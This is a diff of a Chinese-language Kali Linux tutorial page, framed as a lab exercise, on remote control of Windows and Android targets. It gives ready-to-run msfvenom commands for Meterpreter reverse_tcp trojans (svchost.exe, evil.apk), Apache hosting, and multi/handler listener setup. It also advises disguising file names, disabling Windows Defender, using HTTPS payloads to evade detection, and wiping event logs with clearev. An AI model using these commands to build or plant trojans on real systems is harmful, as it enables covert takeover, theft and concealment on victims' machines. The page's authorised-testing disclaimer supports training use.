@@ -5,1274 +5,742 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kali Linux 渗透测试实战教程</title>
     <link rel="icon" type="image/x-icon" href="static/assets/favicon.ico" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" />
-    <link href="https://fonts.googleapis.com/css2?family=Mulish:ital,wght@0,300;0,500;0,600;0,700;1,300&display=swap" rel="stylesheet" />
-    <link href="https://fonts.googleapis.com/css2?family=Kanit:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet" />
     <link type="text/css" href="static/css/main.css" rel="stylesheet" />
-    
-    <style>
-        .tutorial-hero {
-            position: relative;
-            z-index: 10;
-            padding: 100px 32px 40px;
-            text-align: center;
-        }
-        .tutorial-hero h1 {
-            font-family: "Kanit", sans-serif;
-            font-size: clamp(1.8rem, 4vw, 2.8rem);
-            background: linear-gradient(135deg, #6366f1, #06b6d4, #8b5cf6);
-            background-size: 200% 200%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            animation: gradientShift 5s ease infinite;
-        }
-        @keyframes gradientShift {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-        .tutorial-warning {
-            max-width: 800px;
-            margin: 16px auto 0;
-            padding: 12px 20px;
-            border-radius: 12px;
-            background: rgba(245, 158, 11, 0.08);
-            border: 1px solid rgba(245, 158, 11, 0.2);
-            color: #fbbf24;
-            font-size: 0.9rem;
-        }
-        .tutorial-body {
-            position: relative;
-            z-index: 10;
-            max-width: 900px;
-            margin: 0 auto 60px;
-            padding: 0 32px;
-        }
-        .tutorial-body .glass-card {
-            padding: 40px 48px;
-        }
-        /* Markdown rendered content styling */
-        .tutorial-body h2 {
-            font-family: "Kanit", sans-serif;
-            font-size: 1.6rem;
-            color: #e8e8f0;
-            margin: 36px 0 16px;
-            padding-bottom: 8px;
-            border-bottom: 1px solid rgba(255,255,255,0.06);
-        }
-        .tutorial-body h3 {
-            font-family: "Kanit", sans-serif;
-            font-size: 1.2rem;
-            color: #a5b4fc;
-            margin: 28px 0 12px;
-        }
-        .tutorial-body h4 {
-            font-size: 1rem;
-            color: #06b6d4;
-            margin: 20px 0 8px;
-        }
-        .tutorial-body p {
-            color: #9494b8;
-            line-height: 1.85;
-            margin-bottom: 12px;
-        }
-        .tutorial-body strong {
-            color: #e8e8f0;
-            font-weight: 600;
-        }
-        .tutorial-body a {
-            color: #06b6d4;
-        }
-        .tutorial-body a:hover { color: #6366f1; }
-        .tutorial-body ul, .tutorial-body ol {
-            color: #9494b8;
-            margin: 8px 0 16px 24px;
-            line-height: 1.8;
-        }
-        .tutorial-body li { margin-bottom: 4px; }
-        .tutorial-body code {
-            background: rgba(255,255,255,0.06);
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-family: "Courier New", monospace;
-            font-size: 0.9em;
-            color: #e8e8f0;
-        }
-        .tutorial-body pre {
-            background: rgba(0,0,0,0.4);
-            border: 1px solid rgba(255,255,255,0.06);
-            border-radius: 12px;
-            padding: 20px 24px;
-            overflow-x: auto;
-            margin: 16px 0;
-            line-height: 1.6;
-        }
-        .tutorial-body pre code {
-            background: none;
-            padding: 0;
-            font-size: 0.85rem;
-            color: #c9d1d9;
-        }
-        .tutorial-body table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 16px 0;
-            font-size: 0.9rem;
-        }
-        .tutorial-body th {
-            background: rgba(99,102,241,0.1);
-            color: #e8e8f0;
-            padding: 10px 14px;
-            text-align: left;
-            border: 1px solid rgba(255,255,255,0.06);
-            font-weight: 600;
-        }
-        .tutorial-body td {
-            color: #9494b8;
-            padding: 8px 14px;
-            border: 1px solid rgba(255,255,255,0.06);
-        }
-        .tutorial-body hr {
-            border: none;
-            border-top: 1px solid rgba(255,255,255,0.06);
-            margin: 32px 0;
-        }
-        .tutorial-body blockquote {
-            border-left: 3px solid #6366f1;
-            padding: 12px 20px;
-            margin: 16px 0;
-            background: rgba(99,102,241,0.05);
-            border-radius: 0 8px 8px 0;
-            color: #a5b4fc;
-        }
-        @media (max-width: 640px) {
-            .tutorial-body .glass-card { padding: 20px; }
-            .tutorial-body pre { padding: 14px 16px; }
-            .tutorial-body table { font-size: 0.75rem; }
-        }
-    </style>
 </head>
-<body id="page-top">
+<body>
 
-    <canvas id="particle-canvas"></canvas>
-    <div class="noise-overlay"></div>
-    <div class="glow-orbs">
-        <div class="glow-orb orb-1"></div>
-        <div class="glow-orb orb-2"></div>
-        <div class="glow-orb orb-3"></div>
-    </div>
-
+    <!-- Navigation -->
     <nav class="nav" id="mainNav">
         <div class="nav-inner">
             <a class="nav-brand" href="index.html">Li Zhijiang</a>
-            <a href="index.html" style="color:#9494b8;font-size:0.85rem;">← 返回主页</a>
+            <div style="display:flex;align-items:center;gap:12px;">
+                <a href="index.html" style="font-size:13px;color:var(--text-tertiary);">← 返回主页</a>
+                <button class="theme-toggle" id="themeToggle" aria-label="切换明暗主题">
+                    <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"/>
+                        <line x1="12" y1="1" x2="12" y2="3"/>
+                        <line x1="12" y1="21" x2="12" y2="23"/>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/>
+                        <line x1="1" y1="12" x2="3" y2="12"/>
+                        <line x1="21" y1="12" x2="23" y2="12"/>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>
+                    </svg>
+                    <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+                    </svg>
+                </button>
+            </div>
         </div>
     </nav>
 
-    <section class="tutorial-hero">
-        <h1>Kali Linux 渗透测试实战教程</h1>
-        <div class="tutorial-warning">
-            ⚠️ 本教程仅供授权安全测试、学术研究及防御能力提升使用。未经授权入侵他人计算机系统属违法犯罪行为。
-        </div>
-    </section>
+    <!-- Content -->
+    <main class="tutorial-page">
+        <div class="tutorial-container">
+            <div class="content-card">
 
-    <div class="tutorial-body">
-        <div class="glass-card" id="tutorial-content">
-<hr />
-<h2 id="_1">目录</h2>
-<ul>
-<li><a href="#0-前置准备">0. 前置准备</a></li>
-<li><a href="#1-windows-远控实战">1. Windows 远控实战</a></li>
-<li><a href="#2-android-远控实战">2. Android 远控实战</a></li>
-<li><a href="#3-meterpreter-后渗透完整指令手册">3. Meterpreter 后渗透完整指令手册</a></li>
-<li><a href="#4-kali--cpolar-实现-ssh-远程连接">4. Kali + cpolar 实现 SSH 远程连接</a></li>
-<li><a href="#5-故障排查">5. 故障排查</a></li>
-</ul>
-<hr />
-<h2 id="0">0. 前置准备</h2>
-<h3 id="01">0.1 环境说明</h3>
-<table>
-<thead>
-<tr>
-<th>角色</th>
-<th>系统</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>攻击机</td>
-<td>Kali Linux</td>
-<td>渗透测试专用系统，预装 Metasploit、msfvenom 等工具</td>
-</tr>
-<tr>
-<td>靶机 (Windows)</td>
-<td>Windows 10/11</td>
-<td>被测试的 Windows 机器，建议使用虚拟机</td>
-</tr>
-<tr>
-<td>靶机 (Android)</td>
-<td>Android 10+</td>
-<td>被测试的安卓设备，建议使用模拟器</td>
-</tr>
-</tbody>
-</table>
-<h3 id="02">0.2 网络要求</h3>
-<ul>
-<li>攻击机与靶机必须在<strong>同一局域网</strong>（或通过内网穿透可达）</li>
-<li>靶机需要能访问攻击机的 IP 地址</li>
-<li>建议使用 NAT 或 Host-Only 网络模式（虚拟机环境）</li>
-</ul>
-<h3 id="03-kali-ip">0.3 查看 Kali IP 地址</h3>
-<pre><code class="language-bash"># 方式一：ifconfig（推荐）
+                <h1>Kali Linux 渗透测试实战教程</h1>
+                <p style="font-size:16px;color:var(--text-tertiary);margin-bottom:12px;">涵盖 Windows / Android 远控、Meterpreter 后渗透完整指令手册、内网穿透 SSH 远程连接</p>
+
+                <div class="tutorial-warn">
+                    <strong>⚠️ 重要声明：</strong>本教程仅供授权安全测试、学术研究及防御能力提升使用。所有演示请在隔离实验环境（虚拟机 + 内网）中完成。未经授权入侵他人计算机系统属于违法犯罪行为。
+                </div>
+
+                <!-- 目录 -->
+                <div class="tutorial-toc" style="margin-top:32px;">
+                    <p>目录</p>
+                    <ul>
+                        <li><a href="#prep">第零章：前置准备</a></li>
+                        <li><a href="#windows">第一章：Windows 远控实战</a></li>
+                        <li><a href="#android">第二章：Android 远控实战</a></li>
+                        <li><a href="#meterpreter">第三章：Meterpreter 后渗透完整指令手册</a></li>
+                        <li><a href="#cpolar">第四章：Kali + cpolar 实现 SSH 远程连接</a></li>
+                        <li><a href="#troubleshoot">第五章：故障排查</a></li>
+                    </ul>
+                </div>
+
+                <hr />
+
+                <!-- ========== 第零章 ========== -->
+                <h2 id="prep">第零章：前置准备</h2>
+
+                <h3>0.1 实验环境</h3>
+                <table>
+                    <thead><tr><th>角色</th><th>系统</th><th>说明</th></tr></thead>
+                    <tbody>
+                        <tr><td>攻击机</td><td>Kali Linux</td><td>渗透测试专用系统，预装 Metasploit、msfvenom 等</td></tr>
+                        <tr><td>靶机（Windows）</td><td>Windows 10 / 11</td><td>被测试的 Windows 机器，建议用虚拟机</td></tr>
+                        <tr><td>靶机（Android）</td><td>Android 10+</td><td>被测试的安卓设备，建议用模拟器</td></tr>
+                    </tbody>
+                </table>
+
+                <h3>0.2 网络要求</h3>
+                <ul>
+                    <li>攻击机和靶机必须在<strong>同一局域网</strong>（或通过内网穿透可达）</li>
+                    <li>靶机需要能访问攻击机的 IP 地址</li>
+                    <li>虚拟机建议使用 NAT 或 Host-Only 网络模式</li>
+                    <li>做实验时<strong>不要暴露到公网</strong>，否则可能被他人利用</li>
+                </ul>
+
+                <h3>0.3 查看 Kali 的 IP 地址</h3>
+                <p>在 Kali 终端中执行以下任一命令：</p>
+                <pre><code># 方式一（推荐，信息最全）
 ifconfig
-# 找到 eth0 或 ens33 中的 inet 地址，例如：192.168.1.100
+# 找到 eth0 或 ens33 中的 inet 地址，比如 192.168.1.100
 
-# 方式二：ip 命令
-ip addr show
-# 查看 inet 后面的 IP
-
-# 方式三：hostname
+# 方式二（简洁）
 hostname -I
-</code></pre>
-<p><strong>注意：</strong> 每次重启或更换网络后 IP 可能变化，生成木马前务必重新确认。</p>
-<h3 id="04">0.4 常用端口说明</h3>
-<table>
-<thead>
-<tr>
-<th>端口</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>4444</td>
-<td>Metasploit 默认监听端口（可自定义）</td>
-</tr>
-<tr>
-<td>80</td>
-<td>Apache Web 服务默认端口（供靶机下载文件）</td>
-</tr>
-<tr>
-<td>22</td>
-<td>SSH 远程连接端口</td>
-</tr>
-<tr>
-<td>3389</td>
-<td>Windows RDP 远程桌面端口</td>
-</tr>
-<tr>
-<td>5555</td>
-<td>ADB 默认端口</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h2 id="1-windows">1. Windows 远控实战</h2>
-<h3 id="_2">攻击流程总览</h3>
-<pre><code>生成木马(msfvenom) → 启动Web服务(Apache) → 配置监听(msfconsole)
-→ 靶机下载运行 → 获取Meterpreter会话 → 后渗透操作 → 清理痕迹
-</code></pre>
-<hr />
-<h3 id="1-root">步骤 1：切换到 root 权限</h3>
-<pre><code class="language-bash">sudo su
-</code></pre>
-<p><strong>为什么要 root：</strong> Apache 服务默认监听 80 端口（特权端口），且 msfvenom 生成的木马放在 <code>/var/www/html/</code> 需要 root 写入权限。</p>
-<hr />
-<h3 id="2-windows">步骤 2：生成 Windows 木马</h3>
-<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;你的Kali IP&gt; LPORT=&lt;监听端口&gt; -f exe -o &lt;文件名&gt;.exe
-</code></pre>
-<p><strong>参数详解：</strong></p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>-p</code></td>
-<td>Payload 类型</td>
-<td><code>windows/x64/meterpreter/reverse_tcp</code>（64位）或 <code>windows/meterpreter/reverse_tcp</code>（32位）</td>
-</tr>
-<tr>
-<td><code>LHOST</code></td>
-<td>Kali 的 IP 地址（攻击机监听地址）</td>
-<td><code>192.168.1.100</code></td>
-</tr>
-<tr>
-<td><code>LPORT</code></td>
-<td>监听端口</td>
-<td><code>4444</code>（可自定义，避免与常用端口冲突）</td>
-</tr>
-<tr>
-<td><code>-f</code></td>
-<td>输出格式</td>
-<td><code>exe</code>（Windows 可执行文件）</td>
-</tr>
-<tr>
-<td><code>-o</code></td>
-<td>输出路径和文件名</td>
-<td><code>/var/www/html/svchost.exe</code>（直接放到 Web 目录）</td>
-</tr>
-</tbody>
-</table>
-<p><strong>实际示例：</strong></p>
-<pre><code class="language-bash"># 64位系统
+# 直接输出 IP，比如 192.168.1.100
+
+# 方式三（新版 Linux）
+ip addr show
+# 查看 inet 后面的地址</code></pre>
+
+                <div class="tutorial-warn">
+                    <strong>注意：</strong>每次重启 Kali 或更换网络后 IP 可能变化。生成木马之前务必重新确认 IP，否则靶机连不过来。
+                </div>
+
+                <h3>0.4 常用端口速查</h3>
+                <table>
+                    <thead><tr><th>端口</th><th>用途</th></tr></thead>
+                    <tbody>
+                        <tr><td>4444</td><td>Metasploit 默认监听端口（可以改成其他）</td></tr>
+                        <tr><td>80</td><td>Apache Web 服务默认端口</td></tr>
+                        <tr><td>22</td><td>SSH 远程连接</td></tr>
+                        <tr><td>3389</td><td>Windows 远程桌面（RDP）</td></tr>
+                        <tr><td>5555</td><td>ADB（Android Debug Bridge）默认端口</td></tr>
+                    </tbody>
+                </table>
+
+                <hr />
+
+                <!-- ========== 第一章 ========== -->
+                <h2 id="windows">第一章：Windows 远控实战</h2>
+
+                <h3>攻击流程总览</h3>
+                <pre><code>生成木马(msfvenom) → 启动Web服务(Apache) → 启动监听(msfconsole)
+→ 靶机下载并运行 → 获取Meterpreter会话 → 后渗透操作 → 清理痕迹</code></pre>
+
+                <hr />
+
+                <h3>步骤 1：切换到 root 权限</h3>
+                <pre><code>sudo su</code></pre>
+                <p><strong>为什么需要 root：</strong>Apache 的 80 端口是特权端口（1024 以下），非 root 无法监听。同时木马需要放到 <code>/var/www/html/</code> 目录，这个目录也需要 root 权限才能写入。</p>
+
+                <hr />
+
+                <h3>步骤 2：用 msfvenom 生成 Windows 木马</h3>
+
+                <p><strong>基本命令格式：</strong></p>
+                <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=你的KaliIP LPORT=监听端口 -f exe -o 输出文件名.exe</code></pre>
+
+                <p><strong>参数逐一说清楚：</strong></p>
+                <table>
+                    <thead><tr><th>参数</th><th>含义</th><th>怎么填</th></tr></thead>
+                    <tbody>
+                        <tr><td><code>-p</code></td><td>Payload 类型</td><td><code>windows/x64/meterpreter/reverse_tcp</code>（64位系统）或 <code>windows/meterpreter/reverse_tcp</code>（32 位）</td></tr>
+                        <tr><td><code>LHOST</code></td><td>你的 Kali 的 IP 地址</td><td>用 <code>ifconfig</code> 查出来的地址，如 <code>192.168.1.100</code></td></tr>
+                        <tr><td><code>LPORT</code></td><td>监听端口</td><td>自由设定，常用 <code>4444</code></td></tr>
+                        <tr><td><code>-f</code></td><td>输出格式</td><td><code>exe</code>（Windows 可执行文件）</td></tr>
+                        <tr><td><code>-o</code></td><td>输出路径</td><td>直接放到 Apache 目录，如 <code>/var/www/html/svchost.exe</code></td></tr>
+                    </tbody>
+                </table>
+
+                <p><strong>实际敲的命令（替换 IP 为你的）：</strong></p>
+                <pre><code># 64 位 Windows（大部分情况用这个）
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /var/www/html/svchost.exe
 
-# 32位系统（兼容性更好）
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /var/www/html/svchost.exe
+# 32 位 Windows（兼容性更好，但功能少一些）
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /var/www/html/svchost.exe</code></pre>
 
-# 输出示例：
-# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-# [-] No arch selected, selecting arch: x64 from the payload
-# No encoder specified, outputting raw payload
-# Payload size: 510 bytes
-# Final size of exe file: 7168 bytes
-# Saved as: /var/www/html/svchost.exe
-</code></pre>
-<p><strong>Payload 类型选择建议：</strong></p>
-<table>
-<thead>
-<tr>
-<th>Payload</th>
-<th>适用场景</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>windows/x64/meterpreter/reverse_tcp</code></td>
-<td>目标为 64 位 Windows，稳定 TCP 连接</td>
-</tr>
-<tr>
-<td><code>windows/meterpreter/reverse_tcp</code></td>
-<td>目标为 32 位 Windows</td>
-</tr>
-<tr>
-<td><code>windows/x64/meterpreter/reverse_https</code></td>
-<td>需要绕过防火墙/IDS，HTTPS 加密通信</td>
-</tr>
-<tr>
-<td><code>windows/x64/meterpreter_reverse_tcp</code></td>
-<td>stageless 版本，单文件较大但更稳定</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h3 id="3-apache-web">步骤 3：启动 Apache Web 服务</h3>
-<pre><code class="language-bash"># 启动 Apache
+                <p>运行后你应该看到类似这样的输出：</p>
+                <pre><code>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: /var/www/html/svchost.exe</code></pre>
+                <p><strong>Payload size 510 bytes</strong>意思是木马核心只有 510 字节，加上壳一共 7KB，非常小巧。</p>
+
+                <p><strong>Payload 类型怎么选：</strong></p>
+                <table>
+                    <thead><tr><th>Payload</th><th>什么时候用</th></tr></thead>
+                    <tbody>
+                        <tr><td><code>windows/x64/meterpreter/reverse_tcp</code></td><td>目标 64 位 Windows，基础场景</td></tr>
+                        <tr><td><code>windows/meterpreter/reverse_tcp</code></td><td>目标 32 位 Windows</td></tr>
+                        <tr><td><code>windows/x64/meterpreter/reverse_https</code></td><td>需要绕过防火墙 / 杀软检测，走 HTTPS 加密</td></tr>
+                        <tr><td><code>windows/x64/meterpreter_reverse_tcp</code></td><td>stageless 版，单文件更大但更稳定</td></tr>
+                    </tbody>
+                </table>
+
+                <hr />
+
+                <h3>步骤 3：启动 Apache Web 服务</h3>
+                <p>靶机需要通过 HTTP 下载木马文件，所以 Kali 上要跑一个 Web 服务。</p>
+                <pre><code># 启动 Apache
 systemctl start apache2.service
 
-# 验证服务状态
+# 查看状态，确保是 active (running)
 systemctl status apache2.service
 
-# 验证木马文件可访问（浏览器打开）
-# http://&lt;你的IP&gt;/svchost.exe
+# 设置开机自启（可选，下次不用手动启动）
+systemctl enable apache2.service</code></pre>
 
-# 设置开机自启（可选）
-systemctl enable apache2.service
-</code></pre>
-<p><strong>如果 Apache 未安装：</strong></p>
-<pre><code class="language-bash">apt update &amp;&amp; apt install apache2 -y
-</code></pre>
-<hr />
-<h3 id="4-metasploit">步骤 4：启动 Metasploit 并配置监听</h3>
-<pre><code class="language-bash"># 启动 MSF 控制台
-msfconsole
-</code></pre>
-<p>进入 <code>msf6 &gt;</code> 提示符后，粘贴以下配置：</p>
-<pre><code class="language-bash">use exploit/multi/handler
+                <p>启动后在 Kali 浏览器中打开 <code>http://你的IP/svchost.exe</code>，如果能触发下载，说明 Web 服务正常。</p>
+
+                <div class="tutorial-tip">
+                    <strong>如果 Apache 没装：</strong><code>apt update && apt install apache2 -y</code>
+                </div>
+
+                <hr />
+
+                <h3>步骤 4：启动 Metasploit 并配置监听</h3>
+
+                <p>监听器的作用是等靶机运行木马后主动连回来。先打开 MSF 控制台：</p>
+                <pre><code>msfconsole</code></pre>
+
+                <p>看到 <code>msf6 ></code> 提示符后，逐条输入：</p>
+                <pre><code>use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.1.100
 set LPORT 4444
 show options
-exploit -j -z
-</code></pre>
-<p><strong>参数详解：</strong></p>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>use exploit/multi/handler</code></td>
-<td>使用通用监听模块</td>
-</tr>
-<tr>
-<td><code>set payload ...</code></td>
-<td>必须与生成木马时的 payload <strong>完全一致</strong></td>
-</tr>
-<tr>
-<td><code>set LHOST</code></td>
-<td>监听地址（如果 Kali 有多个 IP，设为 0.0.0.0 监听全部）</td>
-</tr>
-<tr>
-<td><code>set LPORT</code></td>
-<td>监听端口（必须与生成木马时一致）</td>
-</tr>
-<tr>
-<td><code>show options</code></td>
-<td>确认所有配置正确</td>
-</tr>
-<tr>
-<td><code>exploit -j -z</code></td>
-<td><code>-j</code> 后台运行，<code>-z</code> 不立即与会话交互</td>
-</tr>
-<tr>
-<td><code>exploit</code></td>
-<td>前台运行（等待上线时可用）</td>
-</tr>
-</tbody>
-</table>
-<p><strong>预期输出：</strong></p>
-<pre><code>[*] Started reverse TCP handler on 192.168.1.100:4444
-</code></pre>
-<hr />
-<h3 id="5">步骤 5：靶机下载并运行木马</h3>
-<p><strong>下载方式（靶机操作）：</strong></p>
-<pre><code>浏览器访问：http://192.168.1.100/svchost.exe
-</code></pre>
-<p><strong>注意：</strong>
-- Windows Defender 可能拦截下载——测试环境建议<strong>临时关闭实时保护</strong>
-- 部分浏览器（Edge）会警告「不安全下载」→ 点「保留」即可
-- 模拟真实场景时，可将文件名伪装为 <code>setup.exe</code>、<code>update.exe</code> 等</p>
-<p><strong>运行木马后，Kali 端会出现：</strong></p>
-<pre><code>[*] Sending stage (200262 bytes) to 192.168.1.105
-[*] Meterpreter session 1 opened (192.168.1.100:4444 -&gt; 192.168.1.105:49876)
-</code></pre>
-<hr />
-<h3 id="6-meterpreter">步骤 6：进入 Meterpreter 会话</h3>
-<pre><code class="language-bash">sessions           # 列出所有活跃会话
-sessions -i 1      # 进入会话 ID=1
-</code></pre>
-<p><strong><code>sessions</code> 命令常用参数：</strong></p>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>sessions</code></td>
-<td>列出所有会话</td>
-</tr>
-<tr>
-<td><code>sessions -i &lt;id&gt;</code></td>
-<td>进入指定会话</td>
-</tr>
-<tr>
-<td><code>sessions -k &lt;id&gt;</code></td>
-<td>终止指定会话</td>
-</tr>
-<tr>
-<td><code>sessions -u &lt;id&gt;</code></td>
-<td>将会话升级为 Meterpreter</td>
-</tr>
-<tr>
-<td><code>sessions -n &lt;name&gt;</code></td>
-<td>为会话命名</td>
-</tr>
-<tr>
-<td><code>background</code></td>
-<td>将当前会话放入后台（在 meterpreter 中执行）</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h3 id="7">步骤 7：测试完成后清理</h3>
-<pre><code class="language-bash"># 1. 在 Meterpreter 中清除事件日志（可选）
-meterpreter &gt; clearev
+exploit -j -z</code></pre>
 
-# 2. 退出会话
-meterpreter &gt; exit
+                <p><strong>每条命令的作用：</strong></p>
+                <table>
+                    <thead><tr><th>命令</th><th>做什么</th></tr></thead>
+                    <tbody>
+                        <tr><td><code>use exploit/multi/handler</code></td><td>加载通用监听模块（专门等反弹连接用的）</td></tr>
+                        <tr><td><code>set payload ...</code></td><td>必须和生成木马时用的 payload <strong>一模一样</strong></td></tr>
+                        <tr><td><code>set LHOST</code></td><td>监听哪个 IP（如果 Kali 有多个网卡，设 <code>0.0.0.0</code> 表示全听）</td></tr>
+                        <tr><td><code>set LPORT</code></td><td>监听端口，必须和生成木马时一致</td></tr>
+                        <tr><td><code>show options</code></td><td>检查当前配置，确认 LHOST 和 LPORT 是对的</td></tr>
+                        <tr><td><code>exploit -j -z</code></td><td><code>-j</code> 后台运行，<code>-z</code> 不自动进入会话</td></tr>
+                    </tbody>
+                </table>
 
-# 3. 在 MSF 中停止监听
-msf6 &gt; jobs -K
+                <p><strong>预期输出：</strong></p>
+                <pre><code>[*] Started reverse TCP handler on 192.168.1.100:4444</code></pre>
 
-# 4. 停止 Apache 服务
+                <div class="tutorial-tip">
+                    <strong>小提示：</strong>如果你想前台运行（能看到实时上线信息），直接用 <code>exploit</code> 不加 <code>-j -z</code>。
+                </div>
+
+                <hr />
+
+                <h3>步骤 5：靶机下载并运行木马</h3>
+
+                <p><strong>靶机操作（在 Windows 虚拟机上）：</strong></p>
+                <ol>
+                    <li>打开浏览器，输入 <code>http://192.168.1.100/svchost.exe</code></li>
+                    <li>浏览器会提示「此文件可能危害计算机」→ 点「保留」</li>
+                    <li>找到下载的文件，双击运行</li>
+                </ol>
+
+                <div class="tutorial-warn">
+                    <strong>Windows Defender 可能会拦截：</strong>测试环境建议<strong>临时关闭实时保护</strong>（设置 → 更新和安全 → Windows 安全中心 → 病毒和威胁防护 → 管理设置 → 关闭实时保护）。实验做完记得开回来。
+                </div>
+
+                <p><strong>靶机运行木马后，Kali 端会出现：</strong></p>
+                <pre><code>[*] Sending stage (200262 bytes) to 192.168.1.105
+[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.105:49876)</code></pre>
+
+                <p><strong>这就说明上线成功了！</strong>靶机的 49876 端口主动连到了你 Kali 的 4444 端口。Session 1 就是你的第一个会话。</p>
+
+                <hr />
+
+                <h3>步骤 6：进入 Meterpreter 会话</h3>
+                <pre><code>sessions              # 列出所有活跃会话
+sessions -i 1         # 进入会话 ID=1</code></pre>
+
+                <p>进入后提示符会变成 <code>meterpreter ></code>，说明你已经可以远程控制靶机了。</p>
+
+                <p><strong>sessions 命令常用操作：</strong></p>
+                <table>
+                    <thead><tr><th>命令</th><th>作用</th></tr></thead>
+                    <tbody>
+                        <tr><td><code>sessions</code></td><td>列出所有会话（看有哪些机器上线了）</td></tr>
+                        <tr><td><code>sessions -i 1</code></td><td>进入会话 1</td></tr>
+                        <tr><td><code>sessions -k 1</code></td><td>终止会话 1（断掉靶机连接）</td></tr>
+                        <tr><td><code>sessions -n 名字</code></td><td>给会话起个名字，方便管理</td></tr>
+                        <tr><td><code>background</code></td><td>在 meterpreter 中执行，把当前会话放后台</td></tr>
+                    </tbody>
+                </table>
+
+                <hr />
+
+                <h3>步骤 7：测试完成后的清理</h3>
+                <pre><code># 在 Meterpreter 中（可选）
+meterpreter > clearev                # 清除 Windows 事件日志
+
+# 退出会话
+meterpreter > exit
+
+# 在 MSF 控制台中停止监听
+msf6 > jobs -K                      # 停止所有后台任务
+
+# 停止 Apache
 sudo systemctl stop apache2.service
 
-# 5. 确认 Apache 已停止
+# 确认 Apache 已停止
 sudo systemctl is-active apache2.service
 # 应输出：inactive
 
-# 6. 删除 Web 目录中的木马文件
-sudo rm /var/www/html/svchost.exe
+# 删除木马文件
+sudo rm /var/www/html/svchost.exe</code></pre>
 
-# 7. 查看 Apache 是否开机自启（通常不需要）
-sudo systemctl is-enabled apache2.service
-# 如果输出 enabled，执行：
-sudo systemctl disable apache2.service
-</code></pre>
-<hr />
-<h2 id="2-android">2. Android 远控实战</h2>
-<h3 id="_3">攻击流程总览</h3>
-<pre><code>生成APK(msfvenom) → 签名APK(jarsigner) → 靶机安装运行
-→ 监听上线 → Meterpreter会话 → 核心功能演示
-</code></pre>
-<hr />
-<h3 id="1-android-apk">步骤 1：生成 Android APK 木马</h3>
-<pre><code class="language-bash">msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;Kali IP&gt; LPORT=&lt;监听端口&gt; -o &lt;文件名&gt;.apk
-</code></pre>
-<p><strong>实际示例：</strong></p>
-<pre><code class="language-bash">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o evil.apk
+                <hr />
 
-# 输出示例：
-# [-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
-# [-] No arch selected, selecting arch: dalvik from the payload
-# No encoder specified, outputting raw payload
-# Payload size: 10146 bytes
-</code></pre>
-<p><strong>关于 Payload：</strong></p>
-<table>
-<thead>
-<tr>
-<th>Payload</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>android/meterpreter/reverse_tcp</code></td>
-<td>标准 TCP 反弹（推荐）</td>
-</tr>
-<tr>
-<td><code>android/meterpreter/reverse_https</code></td>
-<td>HTTPS 加密反弹（绕过检测）</td>
-</tr>
-<tr>
-<td><code>android/meterpreter_reverse_tcp</code></td>
-<td>Stageless 版本（单文件，体积更大）</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h3 id="2-apk">步骤 2：签名 APK</h3>
-<blockquote>
-<p>Android 系统禁止安装未签名的 APK，必须签名后才能安装。</p>
-</blockquote>
-<pre><code class="language-bash"># 第一步：生成签名证书（仅首次需要）
-keytool -genkey -v -keystore my.keystore -alias my -keyalg RSA \
+                <!-- ========== 第二章 ========== -->
+                <h2 id="android">第二章：Android 远控实战</h2>
+
+                <h3>攻击流程总览</h3>
+                <pre><code>生成APK(msfvenom) → 签名APK(jarsigner) → 靶机安装运行
+→ 监听上线 → Meterpreter会话 → 核心功能演示</code></pre>
+
+                <hr />
+
+                <h3>步骤 1：生成 Android APK 木马</h3>
+                <pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=你的KaliIP LPORT=4444 -o evil.apk</code></pre>
+
